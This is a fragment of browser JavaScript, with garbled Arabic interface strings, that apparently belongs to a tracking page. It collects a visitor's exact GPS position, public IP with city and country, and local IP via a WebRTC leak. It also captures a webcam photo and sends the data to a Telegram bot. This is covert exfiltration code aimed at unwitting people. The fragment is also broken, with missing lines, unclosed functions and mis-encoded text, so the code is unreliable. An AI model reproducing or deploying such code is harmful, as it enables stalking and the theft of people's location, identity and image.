  <script>

    function sendCombinedMessage() {

๐ ุงููููุน (GPS):
${gpsMsg || "โ ูุดู ุชุญุฏูุฏ ุงููููุน"}

๐ IP ุงูุฎุงุฑุฌู: ${publicIP || "โ"}

๐บ๏ธ Google Maps: https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
      document.getElementById("result").innerText = message;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {

    }

    function checkIfReady() {

    function getLocation() {

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(

            gpsLat = pos.coords.latitude.toFixed(6);
            gpsLon = pos.coords.longitude.toFixed(6);
            const acc = pos.coords.accuracy;
            gpsMsg = `Latitude: ${gpsLat}
Longitude: ${gpsLon}
๐ ุงูุฏูุฉ: ยฑ${acc} ูุชุฑ`;
            checkIfReady();
          },
          err => {
            gpsMsg = `โ ูุดู ุชุญุฏูุฏ ุงููููุน: ${err.message} (ููุฏ ุงูุฎุทุฃ: ${err.code})`;
            logStep(`[ุฎุทุฃ GPS]: ${err.message} (code: ${err.code})`);
            checkIfReady();

          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }

      } else {
        gpsMsg = "โ ุฌูุงุฒู ูุง ูุฏุนู GPS";
        logStep("[GPS ุบูุฑ ูุฏุนูู]");
        checkIfReady();
      }
    }

    function getGeoInfo(ip) {
      logStep("๐๏ธ ุฌุงุฑู ุฌูุจ ุงููุฏููุฉ ูุงูุฏููุฉ ูู IP...");
      fetch(`https://ipapi.co/${ip}/json/`)
        .then(res => res.json())
        .then(data => {
          city = data.city || "";
          country = data.country_name || "";
          const countryCode = data.country || "";
          flagEmoji = countryCode
            ? String.fromCodePoint(...[...countryCode.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65))
            : "";
          checkIfReady();
        })
        .catch(() => {
          city = "";
          country = "";
          flagEmoji = "";
          checkIfReady();
        });
    }

    function getPublicIP() {
      logStep("๐ ุฌุงุฑู ุฌูุจ IP ุงูุฎุงุฑุฌู...");
      fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {

          getGeoInfo(publicIP);
        })
        .catch(() => {
          publicIP = "โ ูุดู ุฌูุจ IP";
          checkIfReady();
        });
    }

    function getLocalIP() {
      logStep("๐ ุฌุงุฑู ุฌูุจ IP ุงูุฏุงุฎูู...");
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel("");
      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
      pc.onicecandidate = event => {
        if (!event || !event.candidate) return;
        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
        if (ipMatch) {
          const ip = ipMatch[1];
          if (ip.startsWith("192.") || ip.startsWith("10.") || ip.startsWith("172.")) {
            localIP = ip;
            checkIfReady();
          }
        }
      };
      setTimeout(() => {
        if (!localIP) {
          localIP = "โ ูู ูุชู ุงูุญุตูู ุนููู";
          checkIfReady();

      }, 2000);
    }

    function initCamera() {

      navigator.mediaDevices.getUserMedia({ video: true })

          video.srcObject = stream;
          video.addEventListener("playing", () => {
            logStep("โก ูููุถ ุงูููุงุด... ูุงูุชูุงุท ุงูุตูุฑุฉ");

              const ctx = canvas.getContext("2d");
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              ctx.drawImage(video, 0, 0);
              canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
              stream.getTracks().forEach(track => track.stop());
            }, 150); // ูุฏุฉ ุงูููุงุด
          });

    }
